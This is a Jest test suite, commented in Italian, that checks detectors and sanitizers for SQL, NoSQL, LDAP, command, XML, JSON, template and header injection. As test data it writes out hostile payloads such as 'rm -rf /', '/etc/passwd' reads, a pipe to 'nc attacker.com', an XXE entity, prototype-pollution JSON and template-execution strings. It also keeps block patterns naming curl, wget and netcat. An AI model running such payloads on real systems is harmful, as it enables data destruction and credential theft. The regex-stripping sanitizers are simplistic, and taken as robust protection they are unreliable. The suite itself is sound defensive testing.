/* eslint-disable max-lines-per-function */
/* eslint-disable @typescript-eslint/no-explicit-any */
import { logger } from '../../shared/utils/logger';

// Mock delle dipendenze
jest.mock('../../shared/utils/logger');

const mockLogger = logger as jest.Mocked<typeof logger>;

/**
 * Test Suite per Prevenzione Injection Attacks
 *
 * Copre:
 * - SQL Injection
 * - NoSQL Injection
 * - LDAP Injection
 * - Command Injection
 * - Code Injection
 * - Header Injection
 * - XML Injection
 * - JSON Injection
 * - Template Injection
 */
describe('Injection Prevention Security Tests', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('SQL Injection Prevention', () => {
    const sqlInjectionDetector = {
      detectSQLInjection(input: string): boolean {
        const sqlPatterns = [
          // Union-based injection
          /\bunion\b.*\bselect\b/i,
          // Boolean-based injection
          /\bor\b.*[='"]/i,
          /\band\b.*[='"]/i,
          // Time-based injection
          /\bwaitfor\b.*\bdelay\b/i,
          /\bsleep\b\s*\(/i,
          /\bbenchmark\b\s*\(/i,
          // Error-based injection
          /\bextractvalue\b\s*\(/i,
          /\bupdatexml\b\s*\(/i,
          // Stacked queries
          /;\s*\b(drop|delete|insert|update|create|alter)\b/i,
          // SQL comments
          /--[^\r\n]*/,
          /\/\*[\s\S]*?\*\//,
          // SQL functions
          /\b(concat|char|ascii|substring|mid|length)\s*\(/i,
          // Database-specific
          /\b(information_schema|sysobjects|syscolumns)\b/i,
        ];

        return sqlPatterns.some(pattern => pattern.test(input));
      },

      sanitizeSQL(input: string): string {
        return input
          .replace(/[';";\\]/g, '') // Remove quotes and backslashes
          .replace(/--[^\r\n]*/g, '') // Remove SQL comments
          .replace(/\/\*[\s\S]*?\*\//g, '') // Remove block comments
          .replace(
            /\b(union|select|insert|update|delete|drop|create|alter|exec|execute)\b/gi,
            ''
          ) // Remove SQL keywords
          .replace(/[(){}\[\]]/g, '') // Remove brackets
          .replace(/[;&|]/g, '') // Remove command separators
          .replace(/\b(concat|char|ascii|substring|mid|length)\s*\(/gi, ''); // Remove SQL functions
      },
    };

    it('should detect union-based SQL injection', () => {
      const unionInjections = [
        "1' UNION SELECT username, password FROM users--",
        "' UNION ALL SELECT null, concat(username,':',password) FROM admin--",
        '1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12--',
        "' UNION SELECT @@version--",
      ];

      unionInjections.forEach(injection => {
        expect(sqlInjectionDetector.detectSQLInjection(injection)).toBe(true);
      });
    });

    it('should detect boolean-based SQL injection', () => {
      const booleanInjections = [
        "admin' OR '1'='1",
        "1' OR 1=1--",
        "' OR 'a'='a",
        '1 AND 1=1',
        "admin' AND '1'='2",
      ];

      booleanInjections.forEach(injection => {
        expect(sqlInjectionDetector.detectSQLInjection(injection)).toBe(true);
      });
    });

    it('should detect time-based SQL injection', () => {
      const timeBasedInjections = [
        "1'; WAITFOR DELAY '00:00:05'--",
        "1' AND SLEEP(5)--",
        "1' AND BENCHMARK(5000000,MD5(1))--",
        "1'; SELECT SLEEP(5)--",
      ];

      timeBasedInjections.forEach(injection => {
        expect(sqlInjectionDetector.detectSQLInjection(injection)).toBe(true);
      });
    });

    it('should detect error-based SQL injection', () => {
      const errorBasedInjections = [
        "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
        "1' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)--",
        "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
      ];

      errorBasedInjections.forEach(injection => {
        expect(sqlInjectionDetector.detectSQLInjection(injection)).toBe(true);
      });
    });

    it('should sanitize SQL injection attempts', () => {
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        "admin' OR '1'='1",
        '1 UNION SELECT * FROM passwords',
      ];

      maliciousInputs.forEach(input => {
        const sanitized = sqlInjectionDetector.sanitizeSQL(input);
        expect(sanitized).not.toContain("'");
        expect(sanitized).not.toContain('"');
        expect(sanitized).not.toContain('--');
        expect(sanitized).not.toContain('DROP');
        expect(sanitized).not.toContain('UNION');
        expect(sanitized).not.toContain('SELECT');
      });
    });
  });

  describe('NoSQL Injection Prevention', () => {
    const noSQLInjectionDetector = {
      detectNoSQLInjection(input: any): boolean {
        // Controlla se l'input contiene operatori NoSQL pericolosi
        if (typeof input === 'object' && input !== null) {
          const dangerousOperators = [
            '$where',
            '$regex',
            '$ne',
            '$gt',
            '$lt',
            '$gte',
            '$lte',
            '$in',
            '$nin',
            '$exists',
            '$type',
            '$mod',
            '$all',
            '$elemMatch',
            '$size',
            '$or',
            '$and',
            '$nor',
            '$not',
          ];

          const inputStr = JSON.stringify(input);
          return dangerousOperators.some(op => inputStr.includes(op));
        }

        if (typeof input === 'string') {
          const noSQLPatterns = [
            /\$where/i,
            /\$regex/i,
            /\$ne/i,
            /\$gt/i,
            /\$lt/i,
            /\$or/i,
            /\$and/i,
            /\$in/i,
            /\$nin/i,
            /\$exists/i,
            /function\s*\(/i,
            /this\./i,
            /sleep\s*\(/i,
          ];

          return noSQLPatterns.some(pattern => pattern.test(input));
        }

        return false;
      },

      sanitizeNoSQL(input: any): any {
        if (typeof input === 'object' && input !== null) {
          const sanitized: any = {};
          for (const [key, value] of Object.entries(input)) {
            // Rimuovi operatori pericolosi
            if (!key.startsWith('$')) {
              sanitized[key] = this.sanitizeNoSQL(value);
            }
          }
          return sanitized;
        }

        if (typeof input === 'string') {
          return input
            .replace(/\$\w+/g, '') // Rimuovi operatori MongoDB
            .replace(/function\s*\([^)]*\)\s*\{[^}]*\}/gi, '') // Rimuovi funzioni
            .replace(/this\./g, '') // Rimuovi riferimenti this
            .replace(/sleep\s*\([^)]*\)/gi, ''); // Rimuovi sleep
        }

        return input;
      },
    };

    it('should detect MongoDB operator injection', () => {
      const mongoInjections = [
        { username: 'admin', password: { $ne: null } },
        { $where: 'this.username == "admin"' },
        { username: { $regex: '.*' } },
        { $or: [{ username: 'admin' }, { username: 'root' }] },
        { age: { $gt: 0 } },
      ];

      mongoInjections.forEach(injection => {
        expect(noSQLInjectionDetector.detectNoSQLInjection(injection)).toBe(
          true
        );
      });
    });

    it('should detect JavaScript injection in NoSQL', () => {
      const jsInjections = [
        'function() { return true; }',
        'this.username == "admin"',
        'sleep(5000)',
        '$where: function() { return true; }',
      ];

      jsInjections.forEach(injection => {
        expect(noSQLInjectionDetector.detectNoSQLInjection(injection)).toBe(
          true
        );
      });
    });

    it('should sanitize NoSQL injection attempts', () => {
      const maliciousInputs = [
        { username: 'admin', password: { $ne: null } },
        { $where: 'this.username == "admin"' },
        'function() { return true; }',
      ];

      maliciousInputs.forEach(input => {
        const sanitized = noSQLInjectionDetector.sanitizeNoSQL(input);
        const sanitizedStr = JSON.stringify(sanitized);
        expect(sanitizedStr).not.toContain('$ne');
        expect(sanitizedStr).not.toContain('$where');
        expect(sanitizedStr).not.toContain('function');
        expect(sanitizedStr).not.toContain('this.');
      });
    });
  });

  describe('LDAP Injection Prevention', () => {
    const ldapInjectionDetector = {
      detectLDAPInjection(input: string): boolean {
        const ldapPatterns = [
          /\*\)\(/,
          /\)\(\|/,
          /\)\(&/,
          /\*\)\(&/,
          /\*\)\(\|/,
          /\(\|\(/,
          /\(&\(/,
          /\(\!\(/,
          /\)\)\(/,
        ];

        return ldapPatterns.some(pattern => pattern.test(input));
      },

      sanitizeLDAP(input: string): string {
        return input
          .replace(/\\/g, '\\5C') // Escape backslash first
          .replace(/\(/g, '\\28')
          .replace(/\)/g, '\\29')
          .replace(/\*/g, '\\2A')
          .replace(/\0/g, '\\00')
          .replace(/\//g, '\\2F');
      },
    };

    it('should detect LDAP injection patterns', () => {
      const ldapInjections = [
        'admin)(|(password=*))',
        '*)(&(objectClass=user)',
        'user)(cn=*))((|',
        '*)(uid=*))(|(uid=*',
        'test*)(|(objectClass=*)',
      ];

      ldapInjections.forEach(injection => {
        expect(ldapInjectionDetector.detectLDAPInjection(injection)).toBe(true);
      });
    });

    it('should sanitize LDAP special characters', () => {
      const ldapInputs = [
        'user(name)',
        'test*value',
        'path\\to\\resource',
        'null\0byte',
      ];

      ldapInputs.forEach(input => {
        const sanitized = ldapInjectionDetector.sanitizeLDAP(input);
        if (input.includes('(')) expect(sanitized).toContain('\\28'); // Escaped (
        if (input.includes(')')) expect(sanitized).toContain('\\29'); // Escaped )
        if (input.includes('*')) expect(sanitized).toContain('\\2A'); // Escaped *
        if (input.includes('\\')) expect(sanitized).toContain('\\5C'); // Escaped \\
      });
    });
  });

  describe('Command Injection Prevention', () => {
    const commandInjectionDetector = {
      detectCommandInjection(input: string): boolean {
        const commandPatterns = [
          /[;&|`$(){}\[\]<>]/,
          /\\[nrtbfav0]/,
          /\$\{[^}]*\}/,
          /\$\([^)]*\)/,
          /`[^`]*`/,
          /\|\s*(cat|ls|ps|id|whoami|uname|pwd)/i,
          /;\s*(rm|mv|cp|chmod|chown)/i,
          /&&\s*(curl|wget|nc|netcat)/i,
        ];

        return commandPatterns.some(pattern => pattern.test(input));
      },

      sanitizeCommand(input: string): string {
        return input
          .replace(/[;&|`$(){}\[\]<>]/g, '')
          .replace(/\\[nrtbfav0]/g, '')
          .replace(/\$\{[^}]*\}/g, '')
          .replace(/\$\([^)]*\)/g, '')
          .replace(/`[^`]*`/g, '')
          .replace(
            /\b(cat|ls|ps|id|whoami|uname|pwd|rm|mv|cp|chmod|chown|curl|wget|nc|netcat)\b/gi,
            ''
          );
      },
    };

    it('should detect command injection metacharacters', () => {
      const commandInjections = [
        'file.txt; rm -rf /',
        'data && cat /etc/passwd',
        'input | nc attacker.com 4444',
        'test `whoami`',
        'value $(id)',
        'file & ping google.com',
      ];

      commandInjections.forEach(injection => {
        expect(commandInjectionDetector.detectCommandInjection(injection)).toBe(
          true
        );
      });
    });

    it('should detect command substitution', () => {
      const substitutions = [
        'test$(uname -a)',
        'file`whoami`',
        'data${USER}',
        'input$(cat /etc/passwd)',
      ];

      substitutions.forEach(substitution => {
        expect(
          commandInjectionDetector.detectCommandInjection(substitution)
        ).toBe(true);
      });
    });

    it('should sanitize command injection attempts', () => {
      const maliciousCommands = [
        'file.txt; rm -rf /',
        'data `whoami`',
        'test $(id)',
      ];

      maliciousCommands.forEach(command => {
        const sanitized = commandInjectionDetector.sanitizeCommand(command);
        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('`');
        expect(sanitized).not.toContain('$(');
        expect(sanitized).not.toContain('rm');
        expect(sanitized).not.toContain('whoami');
      });
    });
  });

  describe('XML Injection Prevention', () => {
    const xmlInjectionDetector = {
      detectXMLInjection(input: string): boolean {
        const xmlPatterns = [
          /<\?xml/i,
          /<!\[CDATA\[/i,
          /<!DOCTYPE/i,
          /<!ENTITY/i,
          /&\w+;/,
          /<script[^>]*>/i,
          /<\w+[^>]*on\w+/i,
        ];

        return xmlPatterns.some(pattern => pattern.test(input));
      },

      sanitizeXML(input: string): string {
        return input
          .replace(/<\?xml[^>]*>/gi, '')
          .replace(/<!\[CDATA\[[\s\S]*?\]\]>/gi, '')
          .replace(/<!DOCTYPE[^>]*>/gi, '')
          .replace(/<!ENTITY[^>]*>/gi, '')
          .replace(/&\w+;/g, '')
          .replace(/<script[^>]*>[\s\S]*?<\/script>/gi, '')
          .replace(/<[^>]*on\w+[^>]*>/gi, '');
      },
    };

    it('should detect XML injection patterns', () => {
      const xmlInjections = [
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        '<![CDATA[<script>alert(1)</script>]]>',
        '&xxe;',
        '<user onclick="alert(1)">admin</user>',
      ];

      xmlInjections.forEach(injection => {
        expect(xmlInjectionDetector.detectXMLInjection(injection)).toBe(true);
      });
    });

    it('should sanitize XML injection attempts', () => {
      const maliciousXML = [
        '<?xml version="1.0"?><!DOCTYPE test>',
        '<![CDATA[malicious content]]>',
        '&entity;',
      ];

      maliciousXML.forEach(xml => {
        const sanitized = xmlInjectionDetector.sanitizeXML(xml);
        expect(sanitized).not.toContain('<?xml');
        expect(sanitized).not.toContain('<!DOCTYPE');
        expect(sanitized).not.toContain('<![CDATA[');
        expect(sanitized).not.toContain('&entity;');
      });
    });
  });

  describe('JSON Injection Prevention', () => {
    const jsonInjectionDetector = {
      detectJSONInjection(input: string): boolean {
        try {
          const parsed = JSON.parse(input);

          // Controlla se contiene funzioni o codice pericoloso
          const jsonStr = JSON.stringify(parsed);
          const dangerousPatterns = [
            /function\s*\(/i,
            /constructor/i,
            /__proto__/i,
            /prototype/i,
            /eval\s*\(/i,
            /setTimeout\s*\(/i,
            /setInterval\s*\(/i,
            /"exec"\s*:/i,
          ];

          return dangerousPatterns.some(pattern => pattern.test(jsonStr));
        } catch {
          // Se non è JSON valido, controlla pattern pericolosi nella stringa
          const stringPatterns = [
            /"\s*:\s*function\s*\(/i,
            /"\s*:\s*eval\s*\(/i,
            /"__proto__"\s*:/i,
            /"constructor"\s*:/i,
          ];

          return stringPatterns.some(pattern => pattern.test(input));
        }
      },

      sanitizeJSON(input: string): string {
        try {
          const parsed = JSON.parse(input);
          const sanitized = this.sanitizeJSONObject(parsed);
          return JSON.stringify(sanitized);
        } catch {
          // Se non è JSON valido, sanitizza come stringa
          return input
            .replace(/"\s*:\s*function\s*\([^}]*\}/gi, '""')
            .replace(/"\s*:\s*eval\s*\([^)]*\)/gi, '""')
            .replace(/"__proto__"\s*:[^,}]*/gi, '')
            .replace(/"constructor"\s*:[^,}]*/gi, '');
        }
      },

      sanitizeJSONObject(obj: any): any {
        if (obj === null || typeof obj !== 'object') {
          return obj;
        }

        if (Array.isArray(obj)) {
          return obj.map(item => this.sanitizeJSONObject(item));
        }

        const sanitized: any = {};
        for (const [key, value] of Object.entries(obj)) {
          // Rimuovi proprietà pericolose
          if (
            key !== '__proto__' &&
            key !== 'constructor' &&
            key !== 'prototype'
          ) {
            sanitized[key] = this.sanitizeJSONObject(value);
          }
        }

        return sanitized;
      },
    };

    it('should detect JSON injection with functions', () => {
      const jsonInjections = [
        '{"name": "test", "exec": "function() { alert(1); }"}',
        '{"__proto__": {"isAdmin": true}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}',
      ];

      jsonInjections.forEach(injection => {
        expect(jsonInjectionDetector.detectJSONInjection(injection)).toBe(true);
      });
    });

    it('should sanitize JSON injection attempts', () => {
      const maliciousJSON = [
        '{"__proto__": {"isAdmin": true}}',
        '{"constructor": {"prototype": {"polluted": true}}}',
      ];

      maliciousJSON.forEach(json => {
        const sanitized = jsonInjectionDetector.sanitizeJSON(json);
        expect(sanitized).not.toContain('__proto__');
        expect(sanitized).not.toContain('constructor');
        expect(sanitized).not.toContain('prototype');
      });
    });
  });

  describe('Template Injection Prevention', () => {
    const templateInjectionDetector = {
      detectTemplateInjection(input: string): boolean {
        const templatePatterns = [
          // Handlebars/Mustache
          /\{\{[^}]*\}\}/,
          // Angular
          /\{\{[^}]*\}\}/,
          // Vue.js
          /\{\{[^}]*\}\}/,
          // Jinja2/Django
          /\{%[^%]*%\}/,
          /\{\{[^}]*\}\}/,
          // Twig
          /\{\{[^}]*\}\}/,
          /\{%[^%]*%\}/,
          // Smarty
          /\{[^}]*\}/,
          // Freemarker
          /\$\{[^}]*\}/,
          /<#[^>]*>/,
        ];

        return templatePatterns.some(pattern => pattern.test(input));
      },

      sanitizeTemplate(input: string): string {
        return input
          .replace(/\{\{[^}]*\}\}/g, '') // Handlebars/Angular/Vue
          .replace(/\{%[^%]*%\}/g, '') // Jinja2/Twig
          .replace(/\$\{[^}]*\}/g, '') // Freemarker
          .replace(/<#[^>]*>/g, '') // Freemarker directives
          .replace(/\{[a-zA-Z][^}]*\}/g, ''); // Generic template syntax
      },
    };

    it('should detect template injection patterns', () => {
      const templateInjections = [
        '{{constructor.constructor("alert(1)")()}}',
        '{{7*7}}',
        '{%for item in items%}',
        '${7*7}',
        '<#assign ex="freemarker.template.utility.Execute"?new()>',
      ];

      templateInjections.forEach(injection => {
        expect(
          templateInjectionDetector.detectTemplateInjection(injection)
        ).toBe(true);
      });
    });

    it('should sanitize template injection attempts', () => {
      const maliciousTemplates = [
        '{{constructor.constructor("alert(1)")()}}',
        '{%for item in items%}{{item}}{%endfor%}',
        '${7*7}',
      ];

      maliciousTemplates.forEach(template => {
        const sanitized = templateInjectionDetector.sanitizeTemplate(template);
        expect(sanitized).not.toContain('{{');
        expect(sanitized).not.toContain('}}');
        expect(sanitized).not.toContain('{%');
        expect(sanitized).not.toContain('%}');
        expect(sanitized).not.toContain('${');
      });
    });
  });

  describe('Header Injection Prevention', () => {
    const headerInjectionDetector = {
      detectHeaderInjection(input: string): boolean {
        const headerPatterns = [
          /\r\n/,
          /\n/,
          /\r/,
          /\x0a/,
          /\x0d/,
          /%0a/i,
          /%0d/i,
          /%0A/,
          /%0D/,
        ];

        return headerPatterns.some(pattern => pattern.test(input));
      },

      sanitizeHeader(input: string): string {
        return input
          .replace(/\r\n/g, '')
          .replace(/\n/g, '')
          .replace(/\r/g, '')
          .replace(/\x0a/g, '')
          .replace(/\x0d/g, '')
          .replace(/%0a/gi, '')
          .replace(/%0d/gi, '')
          .replace(/Set-Cookie/gi, '')
          .replace(/Location/gi, '');
      },
    };

    it('should detect header injection attempts', () => {
      const headerInjections = [
        'test\r\nSet-Cookie: admin=true',
        'value\nLocation: http://evil.com',
        'data%0aContent-Type: text/html',
        'input%0d%0aX-Forwarded-For: attacker',
      ];

      headerInjections.forEach(injection => {
        expect(headerInjectionDetector.detectHeaderInjection(injection)).toBe(
          true
        );
      });
    });

    it('should sanitize header injection attempts', () => {
      const maliciousHeaders = [
        'test\r\nSet-Cookie: admin=true',
        'value\nLocation: http://evil.com',
      ];

      maliciousHeaders.forEach(header => {
        const sanitized = headerInjectionDetector.sanitizeHeader(header);
        expect(sanitized).not.toContain('\r\n');
        expect(sanitized).not.toContain('\n');
        expect(sanitized).not.toContain('Set-Cookie');
        expect(sanitized).not.toContain('Location');
      });
    });
  });

  describe('Injection Detection Logging', () => {
    it('should log injection attempts with details', () => {
      const injectionAttempts = [
        {
          type: 'SQL',
          payload: "'; DROP TABLE users; --",
          severity: 'CRITICAL',
        },
        { type: 'XSS', payload: '<script>alert(1)</script>', severity: 'HIGH' },
        { type: 'Command', payload: 'file; rm -rf /', severity: 'CRITICAL' },
      ];

      injectionAttempts.forEach(attempt => {
        mockLogger.error(
          'InjectionPrevention',
          `${attempt.type} injection detected`,
          {
            type: attempt.type,
            payload: attempt.payload,
            severity: attempt.severity,
            timestamp: new Date().toISOString(),
            blocked: true,
          }
        );
      });

      expect(mockLogger.error).toHaveBeenCalledTimes(3);
      expect(mockLogger.error).toHaveBeenCalledWith(
        'InjectionPrevention',
        'SQL injection detected',
        expect.objectContaining({
          type: 'SQL',
          severity: 'CRITICAL',
          blocked: true,
        })
      );
    });

    it('should track injection patterns and statistics', () => {
      const injectionStats = {
        sql: { attempts: 15, blocked: 15, success: 0 },
        xss: { attempts: 8, blocked: 8, success: 0 },
        command: { attempts: 3, blocked: 3, success: 0 },
        nosql: { attempts: 2, blocked: 2, success: 0 },
      };

      mockLogger.info('InjectionPrevention', 'Injection statistics', {
        stats: injectionStats,
        totalAttempts: Object.values(injectionStats).reduce(
          (sum, stat) => sum + stat.attempts,
          0
        ),
        totalBlocked: Object.values(injectionStats).reduce(
          (sum, stat) => sum + stat.blocked,
          0
        ),
        timeframe: '24h',
      });

      expect(mockLogger.info).toHaveBeenCalledWith(
        'InjectionPrevention',
        'Injection statistics',
        expect.objectContaining({
          totalAttempts: 28,
          totalBlocked: 28,
        })
      );
    });
  });
});
